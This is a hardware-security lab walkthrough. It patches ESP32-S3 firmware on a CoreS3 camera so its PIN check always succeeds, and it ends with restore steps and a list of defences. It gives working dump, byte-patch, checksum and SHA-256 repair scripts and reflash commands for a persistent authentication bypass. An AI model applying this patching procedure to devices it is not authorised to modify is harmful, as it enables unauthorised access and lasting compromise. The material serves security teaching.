# L06: Binary Patch & Reflash

## Goal
Patch firmware binary to bypass PIN authentication and reflash the device for persistent compromise.

## Background

**Why this matters**: Once you can extract and reflash firmware (L04, L05), you can modify it to bypass authentication, add backdoors, or change device behavior. Binary patching is a core IoT exploitation technique that turns read access into full device control.

**What you're looking for in IoT devices:**
- Authentication checks that can be bypassed (PIN verification, password checks)
- Conditional branches after comparisons (`strcmp`, `memcmp`) that can be forced
- Functions that return pass/fail that can be patched to always return pass

**Why this happens:**
- No firmware signature verification means the device accepts modified firmware
- Debug interfaces (ROM bootloader, JTAG) allow reflashing without authentication
- No secure boot means the device boots any firmware without cryptographic verification

**On CoreS3**: The ESP32-S3 firmware has no signature verification and no secure boot. The `checkUserPIN` function in `CameraApp` compares user input against a stored PIN using `String::equals()`. You can patch this function to always return `true`, bypassing the PIN lock screen entirely. The patched binary is reflashed via the ROM bootloader over USB.

**Tools for binary analysis:**

1. **Disassemblers:**
   - **Ghidra** (free, NSA) - Has Xtensa processor module for ESP32
   - **IDA Pro** (commercial) - Requires Xtensa plugin
   - **Binary Ninja** (commercial) - Supports Xtensa via community plugin
   - **Radare2/rizin** (free) - Command-line, supports Xtensa out of the box

2. **ESP32-specific tools:**
   - **xtensa-esp32s3-elf-objdump** - Disassemble ELF files with full symbol info
   - **esptool.py** - Read/write flash, convert between formats
   - **esp-idf** - Build environment includes all Xtensa cross-tools

3. **Hex editors:**
   - **ImHex** (cross-platform, free) - Pattern language, modern UI
   - **010 Editor** (cross-platform) - Templates for binary file formats
   - **hexeditor/hexedit** (Linux) - Command-line hex editors

4. **Patching strategies for Xtensa (ESP32-S3):**
   - **NOP out checks**: Replace instructions with `nop` (`0x20 0xf0` for 2-byte NOP, `0x20 0x00 0x00` for 3-byte NOP)
   - **Force branch**: Change conditional branch to unconditional (`beqz` to `j`)
   - **Modify return value**: Patch function to always return 1 (true) then `retw`
   - **Modify constants**: Change stored PIN value to a known value

**Xtensa architecture (ESP32-S3):**

The ESP32-S3 uses the Xtensa LX7 instruction set, NOT ARM:
- Variable-length instructions (2-byte "narrow" and 3-byte "wide")
- Registers `a0`-`a15` (`a0` = return address, `a1` = stack pointer, `a2` = first arg / return value)
- Branch instructions: `beqz`, `bnez`, `beq`, `bne`, `j` (unconditional)
- Function return: `ret` or `retw` / `retw.n` (windowed)
- Instructions are stored little-endian in the binary file

**Finding authentication functions in firmware:**
- Search strings: "Invalid PIN", "PIN accepted", "denied", "locked"
- Follow cross-references (XREFs) from those strings to the functions that use them
- Look for `String::equals()` calls followed by conditional branches
- Return values: `a2 = 1` (true/success) vs `a2 = 0` (false/failure)

## Lab Walkthrough

### Step 1: Extract Firmware and Convert to ELF

If you completed L04 (Firmware Extraction), you already have `app.bin` and `firmware.elf`. Skip to Step 2.

Otherwise, dump the application partition from flash and convert it to an ELF for disassembly. Close any serial monitors first - the port must be free for esptool.

```bash
# Extract firmware from device (~5 min)
esptool --chip esp32s3 --port /dev/ttyACM0 read_flash 0x10000 0x300000 app.bin

ls -lh app.bin
# Expected: 3.0M

# Convert to ELF for Ghidra / objdump analysis
python3 ../L04-firmware-extraction/tools/bin2elf.py app.bin firmware.elf
```

You need both files: `app.bin` for patching and reflashing, `firmware.elf` for disassembly in Steps 2-3.

### Step 2: Analyze in Ghidra

Import the binary into Ghidra and locate the `checkUserPIN` function. This is the function called by the touchscreen PIN entry UI - if it returns `true`, the device unlocks.

**Import the ELF into Ghidra:**

```
1. File -> Import File -> select firmware.elf (the ELF from Step 1, NOT app.bin)
2. Ghidra auto-detects: Xtensa:LE:32:default (from the ELF header)
   No manual base address needed - the ELF contains correct load addresses.
   (If importing the raw app.bin instead, set Language to Xtensa:LE:32:default
   and Base Address to 0x42000000)
3. Click OK -> Yes to auto-analyze
4. Wait for analysis to complete (several minutes)
```

**Find the PIN check function:**

The PIN check function references the string "Invalid PIN." which is printed to serial when authentication fails. Use this string to trace back to the function.

```
1. Search -> For Strings -> search for "Invalid PIN"
2. Double-click the string to go to its location in the data section
3. Right-click -> References -> Show References to Address
4. Follow the XREF - this leads to the login handler in SerialShell
5. In that function, look for calls to checkUserPIN or checkAdminPIN
6. Double-click the call target to navigate to the PIN check function
```

**Alternative approach - search for "PIN accepted":**

```
1. Search -> For Strings -> search for "PIN accepted"
2. Follow XREFs from this string
3. The function that references it is checkUserPIN or nearby
```

**What checkUserPIN looks like in the disassembly:**

The function compares the input PIN against the stored PIN using `String::equals()`. If they match, it sets a flag and returns `true`. The key structure is:

```
checkUserPIN:
  entry   a1, 32              ; function prologue (windowed call setup)
  mov.n   a4, a2              ; save 'this' pointer
  addi.n  a11, a2, 8          ; a11 = &this->userPIN (String object)
  or      a10, a3, a3         ; a10 = input PIN parameter
  call8   String::equals()    ; compare input against stored PIN
  mov.n   a2, a10             ; a2 = result (1 if match, 0 if not)
  beqz.n  a10, FALLBACK       ; if no match, try fallback check
  beqz.n  a2, SKIP_FLAG       ; if already zero, skip flag set
  movi.n  a3, 1               ; a3 = 1
  s8i     a3, a4, 1           ; this->unlocked = true
SKIP_FLAG:
  retw.n                      ; return a2 (1=unlocked, 0=locked)
FALLBACK:
  ...                         ; "000000" backdoor check (FACTORY_TEST only)
```

Note the runtime address of the function entry (the `entry` instruction). You will need this to calculate the file offset for patching. In Ghidra, the address is shown in the left column of the listing view.

**Alternative: Use objdump if you have the ELF file:**

If you have access to the build output (`firmware.elf`), you can get exact symbol addresses with full debug info. These are Xtensa cross-tools, not standard Linux binaries - see the main [labs README](../LABS.md) for installation instructions.

```bash
# Find the function address
xtensa-esp32s3-elf-nm firmware.elf | grep checkUserPIN
# Example output: 4200322C T _ZN9CameraApp12checkUserPINERK6String

# Disassemble the function
xtensa-esp32s3-elf-objdump -d firmware.elf | grep -A 20 "checkUserPINERK6String>:"
```

### Step 3: Calculate the File Offset

The address you see in Ghidra is the **runtime address** - where the CPU sees the instruction when it executes from flash. To patch the binary file, you need to convert this to a **file offset**.

ESP32-S3 maps flash contents starting at `0x42000020` (the first segment's load address). But the exact mapping depends on the segment layout. Use this Python one-liner to find the correct file offset for any runtime address:

```bash
# Replace 0x42003278 with the address you found in Ghidra
python3 -c "
import struct
data = open('app.bin','rb').read()
target = 0x42003278  # <-- your address from Ghidra
off = 24
for i in range(data[1]):
    addr = struct.unpack_from('<I', data, off)[0]
    sz = struct.unpack_from('<I', data, off+4)[0]
    if addr <= target < addr + sz:
        foff = (off + 8) + (target - addr)
        print(f'Segment {i}: base=0x{addr:08X}, size=0x{sz:X}')
        print(f'Runtime address: 0x{target:08X}')
        print(f'File offset: 0x{foff:X} ({foff})')
        import binascii
        print(f'Bytes at offset: {binascii.hexlify(data[foff:foff+8],\" \").decode()}')
        break
    off += 8 + sz
else:
    print(f'Address 0x{target:08X} not found in any segment')
"
```

**Expected output** (addresses vary per build):
```
Segment 2: base=0x42000020, size=0x18E19C
Runtime address: 0x42003278
File offset: 0x73278 (471672)
Bytes at offset: 36 41 00 4d 02 8b b2 30
```

The first bytes `36 41 00` are the `entry a1, 32` instruction (the function prologue) stored in little-endian byte order. This confirms you found the right location.

### Step 4: Patch the Binary

The patch replaces the beginning of `checkUserPIN` with instructions that immediately return `true` (1), bypassing the PIN comparison entirely. The original function is 7+ instructions; we only need 3:

```
entry   a1, 32    ; keep the original function prologue (required for windowed return)
movi.n  a2, 1     ; set return value to 1 (true = PIN correct)
retw.n            ; return to caller
```

These 3 instructions encode to 7 bytes:
```
36 41 00    entry a1, 32  (3 bytes - keep original)
0c 12       movi.n a2, 1  (2 bytes - set a2 = 1)
1d f0       retw.n        (2 bytes - return)
```

Apply the patch:

**Copy the command exactly** - the hex bytes must be precise. A single wrong byte means the patch does nothing or crashes the device.

```bash
cp app.bin app_patched.bin

# Write the 7-byte patch at the file offset found in Step 3
# Replace 0x73278 with YOUR offset from the previous step
printf '\x36\x41\x00\x0c\x12\x1d\xf0' | dd of=app_patched.bin bs=1 seek=$((0x73278)) conv=notrunc
#        ^^^^^^^^^^^                     keep: entry a1, 32
#                    ^^^^^^^^^           NEW:  movi.n a2, 1 (return true)
#                              ^^^^^^^^^  NEW:  retw.n (return)
```

**Verify immediately** - compare the patched file against the original to confirm exactly 4 bytes changed:

```bash
xxd -s $((0x73278)) -l 8 app.bin
# Original: 3641 004d 028b b230
#                 ^^^^^^^^^ original instructions (mov.n, addi.n, or)

xxd -s $((0x73278)) -l 8 app_patched.bin
# Patched:  3641 000c 121d f030
#                 ^^^^^^^^^ new instructions (movi.n a2,1 + retw.n)
```

**STOP** - if bytes 4-7 are not `0c 12 1d f0`, the patch is wrong. The most common mistake is copying the original bytes (`4d 02`) instead of the patch bytes (`0c 12`). Re-run the `printf` command above.

**Why these specific bytes?**

- `36 41 00` = `entry a1, 32`: The Xtensa windowed register ABI requires every function to start with `entry`. Without it, `retw.n` would corrupt the register state. We keep the original 3 bytes unchanged.
- `0c 12` = `movi.n a2, 1`: The narrow (2-byte) `movi` instruction. Register `a2` holds the return value in the Xtensa calling convention. Setting it to 1 means "PIN is correct."
- `1d f0` = `retw.n`: The narrow windowed return instruction. Execution returns to the caller (`CameraApp::pin_btn_event_cb`) which sees `a2 = 1` and unlocks the device.

### Step 5: Fix the XOR Checksum

Patching the function bytes changed data inside a segment, which invalidates the image's XOR checksum. The bootloader checks this at boot and rejects the image with "Checksum failed" if it does not match.

The checksum covers all segment data bytes (not headers), seeded with `0xEF`. Recalculate it:

```bash
python3 -c "
import struct
data = bytearray(open('app_patched.bin','rb').read())
chk = 0xEF
off = 24
for i in range(data[1]):
    sz = struct.unpack_from('<I', data, off+4)[0]
    for j in range(off+8, off+8+sz):
        chk ^= data[j]
    off += 8 + sz
ckpos = ((off + 16) & ~15) - 1
print(f'Old checksum: 0x{data[ckpos]:02X}')
data[ckpos] = chk
print(f'New checksum: 0x{chk:02X}')
open('app_patched.bin','wb').write(data)
print('Checksum fixed')
"
```

### Step 6: Fix the SHA256 Hash

The image also has a SHA-256 hash covering everything from byte 0 through the checksum byte. Since both the function bytes and the checksum changed, the hash is now invalid. The bootloader rejects the image with "Could Not Activate The Firmware" if the hash is wrong.

```bash
python3 -c "
import struct, hashlib
data = bytearray(open('app_patched.bin','rb').read())
off = 24
for i in range(data[1]):
    sz = struct.unpack_from('<I', data, off+4)[0]
    off += 8 + sz
ckpos = ((off + 16) & ~15) - 1
hash_start = ckpos + 1
new_hash = hashlib.sha256(data[:hash_start]).digest()
data[hash_start:hash_start+32] = new_hash
open('app_patched.bin','wb').write(data)
print(f'SHA256 updated at offset 0x{hash_start:X}')
"
```

**Verify the patched image:**

```bash
# Confirm esptool can parse it without errors
esptool image_info app_patched.bin
# Should show "Detected image type: ESP32-S3" with no errors

# Confirm file size is unchanged
ls -l app.bin app_patched.bin
# Both must be the same size

# Confirm the patch bytes are present
xxd -s $((0x73278)) -l 8 app_patched.bin
# Should show: 3641 000c 121d f0xx (where xx is the next original byte)
```

### Step 7: Reflash Patched Firmware

Write the patched binary back to the factory partition at offset `0x10000`. There is no secure boot or signature verification to prevent this.

```bash
# Close any serial monitors first
esptool --chip esp32s3 --port /dev/ttyACM0 write_flash 0x10000 app_patched.bin
```

The device reboots automatically after flashing.

### Step 8: Verify PIN Bypass

Connect to the device and test that the PIN lock screen now accepts any input. The patched `checkUserPIN` always returns `true`, so any 6-digit PIN (or even a partial entry) will unlock the device.

```bash
pio device monitor -b 115200
```

```
# Option A: Via touchscreen (requires WiFi to be configured so device shows PIN screen)
# 1. Enter any wrong PIN (e.g., 000000 or 123456)
# 2. Press the checkmark button
# 3. The device should transition from PIN lock screen to camera view

# Option B: Via serial console (works even without WiFi configured)
cores3-cam> login 000000
User authenticated.
# Any PIN is accepted - the patched checkUserPIN always returns true
```

**Impact:**
- Extracted firmware from flash via ROM bootloader (no authentication required)
- Located `checkUserPIN` by tracing string XREFs in Ghidra
- Patched 4 bytes (movi.n + retw.n) to force authentication bypass
- Fixed XOR checksum and SHA256 hash so the bootloader accepts the image
- Reflashed without any signature or integrity verification
- Any PIN now unlocks the device - persistent compromise surviving reboots

### Step 9: Restore Original Firmware

The patched firmware was written directly to the factory partition. To restore, erase flash and reflash the clean firmware:

```bash
# Close any serial monitors first

# Full erase clears everything
esptool --chip esp32s3 --port /dev/ttyACM0 erase_flash

# Reflash the clean firmware
pio run -e M5CoreS3 -t upload

# Verify
pio device monitor -b 115200
cores3-cam> status
# Should show: Firmware: 1.0.0
# PIN bypass should no longer work - wrong PIN rejected again
```

## Defenses

**How to prevent binary patching attacks:**
- **Enable Secure Boot V2**: ESP32-S3 supports RSA-3072 or ECDSA signature verification via eFuse. The bootloader verifies the firmware signature on every boot and refuses to run unsigned or modified images.
- **Enable Flash Encryption**: AES-256-XTS encryption of flash contents. An attacker who dumps flash sees only ciphertext - they cannot read or patch the firmware without the encryption key (stored in eFuse).
- **Disable ROM bootloader download mode**: Burn the `DIS_DOWNLOAD_MANUAL_ENCRYPT` and `DIS_DOWNLOAD_MODE` eFuses to permanently prevent `esptool` from reading or writing flash.
- **Disable JTAG**: Burn the `DIS_PAD_JTAG` and `DIS_USB_JTAG` eFuses to disable all debug access.
- **Note**: These protections are one-time eFuse burns and cannot be reversed.

## References

- [Ghidra - NSA Reverse Engineering Tool](https://ghidra-sre.org/)
- [Ghidra Xtensa Processor Module](https://github.com/Ebiroll/ghidra-xtensa)
- [ESP32-S3 Technical Reference Manual - Memory Map](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
- [ESP32 App Image Format](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/system/app_image_format.html)
- [esptool.py Documentation](https://docs.espressif.com/projects/esptool/)
- [ESP32-S3 Secure Boot V2](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/secure-boot-v2.html)
- [ESP32-S3 Flash Encryption](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/flash-encryption.html)
- [Xtensa Instruction Set Architecture Reference](https://www.cadence.com/content/dam/cadence-www/global/en_US/documents/tools/ip/tensilica-ip/isa-summary.pdf)
